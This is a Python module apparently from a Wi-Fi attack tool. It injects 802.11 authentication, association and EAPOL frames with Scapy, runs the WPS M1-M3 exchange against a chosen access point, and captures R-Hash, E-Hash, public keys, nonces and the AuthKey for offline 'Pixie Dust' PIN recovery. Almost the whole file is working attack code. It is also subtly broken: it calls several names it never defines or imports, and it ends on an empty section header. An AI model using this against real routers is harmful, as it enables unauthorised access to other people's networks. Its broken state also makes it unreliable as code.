"""WPS session state machine."""
from __future__ import annotations
import hashlib, hmac, logging, os, struct, time
from typing import Any, Optional
log = logging.getLogger(__name__)
from ._constants import WpsAttr, WpsMsgType, EapWscOpCode, WpsLockState
from ._crypto import _dh_generate_keypair, _dh_compute_shared, _dh_pub_to_bytes, _dh_bytes_to_int, _derive_auth_key, _compute_psk1, _compute_psk2, _compute_e_hash, _compute_authenticator
from ._protocol import _tlv_parse, _tlv_build, _build_m1, _build_m3, _build_wsc_nack, _eap_wsc_response_identity, _eap_wsc_message, _eapol_wrap, _dot11_eapol_frame

@dataclass
class WscCapture:
    """Data captured during one WPS EAP-WSC exchange (M1-M3 minimum).

    Attributes:
        enrollee_nonce: 16-byte nonce we sent in M1.
        registrar_nonce: 16-byte nonce received in M2.
        pke: 192-byte enrollee DH public key (ours).
        pkr: 192-byte registrar DH public key (from M2).
        r_hash1: 32-byte R-Hash1 from M2 (registrar side).
        r_hash2: 32-byte R-Hash2 from M2 (registrar side).
        e_hash1: 32-byte E-Hash1 from M3.
        e_hash2: 32-byte E-Hash2 from M3.
        auth_key: 32-byte WPS AuthKey derived from DH shared secret.
        priv_key: Local DH private key (big integer).
        m2_raw: Raw M2 body bytes (for Authenticator chain).
        m3_raw: Raw M3 body bytes (for Authenticator chain).
        network_key: Recovered network PSK bytes (from M8, if applicable).
        ssid: Recovered SSID bytes (from M8, if applicable).
    """

    enrollee_nonce: bytes = b""
    registrar_nonce: bytes = b""
    pke: bytes = b""
    pkr: bytes = b""
    r_hash1: bytes = b""
    r_hash2: bytes = b""
    e_hash1: bytes = b""
    e_hash2: bytes = b""
    auth_key: bytes = b""
    priv_key: int = 0
    m2_raw: bytes = b""
    m3_raw: bytes = b""
    network_key: bytes | None = None
    ssid: bytes | None = None


class WscSession:
    """WPS EAP-WSC session state machine using Scapy for frame injection.

    Manages one complete WPS enrollment attempt: optional 802.11 association,
    EAP identity exchange, and the M1-M8 WPS protocol state machine.

    Args:
        bssid: Target AP BSSID in colon-separated format.
        iface: Monitor-mode wireless interface name.
        timeout: Per-frame receive timeout in seconds.
        verbose: Emit detailed debug logging if True.
    """

    # EAP exchange states
    _STATE_INIT       = "INIT"
    _STATE_ASSOCIATED = "ASSOCIATED"
    _STATE_IDENTITY   = "IDENTITY"
    _STATE_WSC_START  = "WSC_START"
    _STATE_M1_SENT    = "M1_SENT"
    _STATE_M2_RECV    = "M2_RECV"
    _STATE_M3_SENT    = "M3_SENT"
    _STATE_M4_RECV    = "M4_RECV"
    _STATE_DONE       = "DONE"
    _STATE_NACK       = "NACK"
    _STATE_FAILED     = "FAILED"

    def __init__(
        self,
        bssid: str,
        iface: str,
        timeout: float = 10.0,
        verbose: bool = False,
    ) -> None:
        self.bssid = bssid
        self.iface = iface
        self.timeout = timeout
        self.verbose = verbose

        self.state = self._STATE_INIT
        self._eap_id = 0
        self._seq = 0
        self._capture = WscCapture()
        self._src_mac = _iface_get_mac(iface)
        self._src_mac_bytes = bytes(int(b, 16) for b in self._src_mac.split(":"))

        # Cached received frames (for state machine)
        self._pending_msg: bytes | None = None

    # ------------------------------------------------------------------
    # Internal Scapy helpers
    # ------------------------------------------------------------------

    def _send(self, eap_bytes: bytes) -> None:
        """Inject an EAP frame as a monitor-mode 802.11 data frame.

        Args:
            eap_bytes: Raw EAP frame bytes (without EAPOL header).
        """
        if not _SCAPY_OK:
            return
        frame = _dot11_eapol_frame(
            bssid=self.bssid,
            src_mac=self._src_mac,
            eap_payload=eap_bytes,
            seq=self._seq,
        )
        self._seq = (self._seq + 1) & 0xFFF
        sendp(frame, iface=self.iface, verbose=0)

    def _sniff_eapol(self, timeout: float | None = None) -> bytes | None:
        """Sniff one EAPOL frame from the AP matching our bssid.

        Waits for a data frame from the AP (addr2 == bssid) containing
        EAPOL/EAP payload.

        Args:
            timeout: Sniff timeout in seconds. Uses self.timeout if None.

        Returns:
            Raw EAP frame bytes (without EAPOL header), or None on timeout.
        """
        if not _SCAPY_OK:
            return None
        t = timeout if timeout is not None else self.timeout
        bssid_lower = self.bssid.lower()

        captured: list = []

        def _handler(pkt) -> None:
            if not pkt.haslayer(Dot11):
                return
            dot11 = pkt[Dot11]
            if (dot11.addr2 or "").lower() != bssid_lower:
                return
            raw = bytes(pkt)
            # Locate EAPOL ethertype 0x888E in LLC/SNAP
            idx = raw.find(b"\x88\x8E")
            if idx < 0:
                return
            # EAPOL body starts 2 bytes after ethertype: version(1)+type(1)+length(2)+EAP
            eapol_start = idx + 2
            if eapol_start + 4 > len(raw):
                return
            eap_len = struct.unpack(">H", raw[eapol_start+2:eapol_start+4])[0]
            eap_start = eapol_start + 4
            eap_end = eap_start + eap_len
            if eap_end > len(raw):
                return
            captured.append(raw[eap_start:eap_end])

        sniff(
            iface=self.iface,
            prn=_handler,
            count=1,
            timeout=t,
            store=False,
        )
        return captured[0] if captured else None

    def _send_auth_assoc_eapol_start(self, channel: int = 0) -> bool:
        """Send 802.11 Auth -> AssocReq -> EAPOL-Start to initiate EAP-WSC exchange.

        Without this sequence the AP never sends EAP-Request/Identity and the
        WPS engine waits indefinitely. Must be called before the first EAPOL sniff.

        Note: Some APs advertise a channel in beacons but operate at a slightly
        different frequency (channel drift/mismatch). If scan reports ch3 but
        capture fails, try adjacent channels (ch4, ch2). Use
        `iw dev <iface> scan` to confirm the actual AP operating frequency.

        Args:
            channel: AP channel for interface tuning before injection.
                     Pass 0 (default) to skip channel switching.

        Returns:
            True if the sequence was sent without exceptions.
        """
        if not _SCAPY_OK:
            return False
        bssid = self.bssid
        iface = self.iface
        own_mac = self._src_mac
        try:
            if channel > 0:
                subprocess.run(
                    ["iw", iface, "set", "channel", str(channel)],
                    capture_output=True,
                    timeout=5,
                )
                time.sleep(0.1)

            # 1. Auth frame (Open System Authentication)
            auth_pkt = (
                RadioTap()
                / Dot11(addr1=bssid, addr2=own_mac, addr3=bssid, type=0, subtype=11)
                / Dot11Auth(algo=0, seqnum=1, status=0)
            )
            sendp(auth_pkt, iface=iface, verbose=False, count=3, inter=0.05)
            time.sleep(0.3)

            # 2. AssocReq — WPS-mode frame (NO RSN IE, correct WPS IE)
            # Critical: RSN IE in AssocReq causes AP to treat enrollee as WPA2 client
            # and reject with Deauth. WPS enrollment uses open auth at 802.11 layer.
            # WPS 2.0 IE: type=dd, len=9, OUI=00:50:f2:04, Version2 TLV=104a0001 10
            wps_ie_bytes = bytes([
                0xdd, 0x09,                         # Vendor specific, len=9
                0x00, 0x50, 0xf2, 0x04,             # WFA OUI + WPS type
                0x10, 0x4a, 0x00, 0x01, 0x10,       # Version TLV (Version2 = 0x20 → WPS 2.0)
            ])
            # ExtendedCap IE (bit 2 = BSS Transition, bit 19 = BSS-Coex) — helps with some APs
            ext_cap = bytes([0x7f, 0x08, 0x04, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00])
            assoc_pkt = (
                RadioTap()
                / Dot11(
                    addr1=bssid, addr2=own_mac, addr3=bssid,
                    type=0, subtype=0,
                    FCfield=0x00,       # no ToDS/FromDS for management frames
                )
                / Dot11AssoReq(
                    cap=0x0411,         # ESS + Short Preamble (NO Privacy = 0x0010)
                    listen_interval=10,
                )
                / Dot11Elt(ID=0, info=ssid_bytes)                          # SSID
                / Dot11Elt(ID=1, info=b"\x82\x84\x8b\x96\x0c\x12\x18\x24")  # Basic Rates
                / Dot11Elt(ID=50, info=b"\x30\x48\x60\x6c")               # Extended Rates
                / Raw(load=wps_ie_bytes)                                    # WPS IE
            )
            sendp(assoc_pkt, iface=iface, verbose=False, count=3, inter=0.05)
            time.sleep(0.4)

            # 3. EAPOL-Start — data frame ToDS=1 to trigger AP EAP exchange
            #    The AP responds with EAP-Request/Identity which starts WSC.
            eapol_start = (
                RadioTap()
                / Dot11(
                    type=2, subtype=0,
                    FCfield=0x01,       # ToDS=1, FromDS=0 — STA → AP
                    addr1=bssid,        # Receiver = AP
                    addr2=own_mac,      # Transmitter = STA
                    addr3=bssid,        # BSSID
                    SC=0x0000,
                )
                / EAPOL(version=1, type=1)   # EAPOL-Start
            )
            sendp(eapol_start, iface=iface, verbose=False, count=3, inter=0.05)
            logger.debug("Auth+Assoc+EAPOL-Start sent to %s on %s", bssid, iface)
            return True
        except Exception as exc:
            logger.warning("Failed to send Auth+Assoc+EAPOL-Start: %s", exc)
            return False

    def _parse_wsc_msg(self, eap_frame: bytes) -> tuple[int, int, bytes] | None:
        """Parse an EAP-WSC frame and extract op_code and TLV payload.

        Args:
            eap_frame: Raw EAP frame bytes (code + id + length + body).

        Returns:
            Tuple of (eap_id, op_code, tlv_bytes) or None on parse failure.
        """
        if len(eap_frame) < 12:
            return None
        # code(1), id(1), length(2), type(1)=0xFE, vendor_id(3), vendor_type(4), op_code(1), flags(1)
        eap_id  = eap_frame[1]
        eap_type = eap_frame[4]
        if eap_type != 0xFE:
            return None
        vendor_id   = eap_frame[5:8]
        vendor_type = eap_frame[8:12]
        if vendor_id != _EAP_WSC_VENDOR_ID or vendor_type != _EAP_WSC_VENDOR_TYPE:
            return None
        op_code = eap_frame[12]
        # flags byte at [13] - handle fragmentation flag if needed
        tlv_bytes = eap_frame[14:]
        return eap_id, op_code, tlv_bytes

    # ------------------------------------------------------------------
    # M1-M3 exchange for Pixie Dust capture
    # ------------------------------------------------------------------

    def capture_m2_for_pixie_dust(self, pin: str) -> WscCapture | None:
        """Run M1 -> M2 -> M3 exchange to capture Pixie Dust material.

        Sends M1 and captures M2 from the AP. Extracts R-Hash1, R-Hash2,
        PKR, registrar nonce, and computes the shared DH secret to derive
        the AuthKey needed for offline Pixie Dust analysis.

        Also sends M3 with the provided PIN's hash values, then captures
        the M4 response. A NACK is sent to cleanly abort the session.

        Args:
            pin: 8-digit WPS PIN to use for E-Hash computation in M3.

        Returns:
            WscCapture with all extracted fields, or None on failure.
        """
        if not _SCAPY_OK:
            logger.error("scapy not available - cannot run EAP-WSC exchange")
            return None

        # Generate fresh DH keypair and nonces
        priv_key, pub_key = _dh_generate_keypair()
        pke = _dh_pub_to_bytes(pub_key)
        enrollee_nonce = secrets.token_bytes(16)
        e_snonce1 = secrets.token_bytes(16)
        e_snonce2 = secrets.token_bytes(16)

        self._capture.priv_key = priv_key
        self._capture.pke = pke
        self._capture.enrollee_nonce = enrollee_nonce

        # Send 802.11 Auth + AssocReq + EAPOL-Start to trigger EAP-Request/Identity.
        # Without this sequence the AP never initiates the EAP exchange.
        self._send_auth_assoc_eapol_start()
        time.sleep(0.2)

        # --- Step 1: Wait for EAP-Request/Identity from AP ---
        logger.debug("WSC: waiting for EAP-Request/Identity from AP")
        eap_frame = self._sniff_eapol(timeout=self.timeout)
        if eap_frame is None:
            logger.warning("WSC: no EAP-Request/Identity received (timeout)")
            return None

        if len(eap_frame) < 4 or eap_frame[0] != 0x01:
            logger.debug("WSC: unexpected frame code 0x%02X, expected 0x01 (Request)", eap_frame[0])
            return None
        self._eap_id = eap_frame[1]

        # --- Step 2: Send EAP-Response/Identity ---
        logger.debug("WSC: sending EAP-Response/Identity (id=%d)", self._eap_id)
        self._send(_eap_wsc_response_identity(self._eap_id))

        # --- Step 3: Receive WSC-Start ---
        eap_frame = self._sniff_eapol()
        if eap_frame is None:
            logger.warning("WSC: no WSC-Start received")
            return None
        parsed = self._parse_wsc_msg(eap_frame)
        if parsed is None:
            return None
        self._eap_id, op_code, _ = parsed
        if op_code != EapWscOpCode.WSC_START:
            logger.warning("WSC: expected WSC_START, got op_code=0x%02X", op_code)

        # --- Step 4: Send M1 ---
        m1_tlv = _build_m1(enrollee_nonce, pke, self._src_mac_bytes)
        logger.debug("WSC: sending M1 (eap_id=%d)", self._eap_id)
        self._send(_eap_wsc_message(self._eap_id, EapWscOpCode.WSC_MSG, m1_tlv))
        self.state = self._STATE_M1_SENT

        # --- Step 5: Receive M2 ---
        eap_frame = self._sniff_eapol()
        if eap_frame is None:
            logger.warning("WSC: no M2 received")
            return None
        parsed = self._parse_wsc_msg(eap_frame)
        if parsed is None:
            return None
        self._eap_id, op_code, m2_tlv = parsed
        if op_code != EapWscOpCode.WSC_MSG:
            logger.warning("WSC: expected WSC_MSG for M2, got 0x%02X", op_code)
            return None

        m2_attrs = _tlv_parse(m2_tlv)
        msg_type = m2_attrs.get(WpsAttr.MSG_TYPE, b"\x00")
        if msg_type and msg_type[0] == WpsMsgType.M2D:
            logger.info("WSC: AP sent M2D (WPS locked or not configured)")
            return None
        if not msg_type or msg_type[0] != WpsMsgType.M2:
            logger.warning("WSC: unexpected message type 0x%02X in M2 position", msg_type[0] if msg_type else 0)
            return None

        pkr_bytes = m2_attrs.get(WpsAttr.PUBLIC_KEY, b"")
        reg_nonce = m2_attrs.get(WpsAttr.REGISTRAR_NONCE, b"")
        r_hash1   = m2_attrs.get(WpsAttr.R_HASH1, b"")
        r_hash2   = m2_attrs.get(WpsAttr.R_HASH2, b"")

        if len(pkr_bytes) != _DH_PRIME_LEN or len(reg_nonce) != 16:
            logger.warning("WSC: M2 missing or malformed PKR/registrar nonce")
            return None

        # Derive shared secret and AuthKey
        pkr_int = _dh_bytes_to_int(pkr_bytes)
        dh_shared = _dh_compute_shared(priv_key, pkr_int)
        auth_key = _derive_auth_key(dh_shared, enrollee_nonce, reg_nonce)

        self._capture.pkr             = pkr_bytes
        self._capture.registrar_nonce = reg_nonce
        self._capture.r_hash1         = r_hash1
        self._capture.r_hash2         = r_hash2
        self._capture.auth_key        = auth_key
        self._capture.m2_raw          = m2_tlv
        self.state = self._STATE_M2_RECV

        # --- Step 6: Compute E-Hash values and send M3 ---
        pin_bytes = pin.encode("ascii")
        psk1 = _compute_psk1(auth_key, pin_bytes[:4])
        psk2 = _compute_psk2(auth_key, pin_bytes[4:])
        e_hash1 = _compute_e_hash(auth_key, psk1, pke, pkr_bytes, e_snonce1)
        e_hash2 = _compute_e_hash(auth_key, psk2, pke, pkr_bytes, e_snonce2)

        self._capture.e_hash1 = e_hash1
        self._capture.e_hash2 = e_hash2

        m3_tlv = _build_m3(enrollee_nonce, reg_nonce, e_hash1, e_hash2, auth_key, m2_tlv)
        logger.debug("WSC: sending M3")
        self._send(_eap_wsc_message(self._eap_id, EapWscOpCode.WSC_MSG, m3_tlv))
        self._capture.m3_raw = m3_tlv
        self.state = self._STATE_M3_SENT

        # --- Step 7: Receive M4 (AP discloses R-SNonce1 enc) ---
        eap_frame = self._sniff_eapol()
        if eap_frame is not None:
            parsed = self._parse_wsc_msg(eap_frame)
            if parsed is not None:
                self._eap_id, op_code, m4_tlv = parsed
                m4_attrs = _tlv_parse(m4_tlv)
                msg_type = m4_attrs.get(WpsAttr.MSG_TYPE, b"\x00")
                if msg_type and msg_type[0] == WpsMsgType.WSC_NACK:
                    logger.debug("WSC: AP sent NACK (PIN first half rejected)")
                    self.state = self._STATE_NACK
                else:
                    self.state = self._STATE_M4_RECV

        # Send NACK to cleanly abort the session
        nack_tlv = _build_wsc_nack(enrollee_nonce, reg_nonce)
        self._send(_eap_wsc_message(self._eap_id, EapWscOpCode.WSC_NACK, nack_tlv))

        logger.debug("WSC: session complete, state=%s", self.state)
        return self._capture


# ---------------------------------------------------------------------------
# Pixie Dust Offline PIN Recovery
# ---------------------------------------------------------------------------

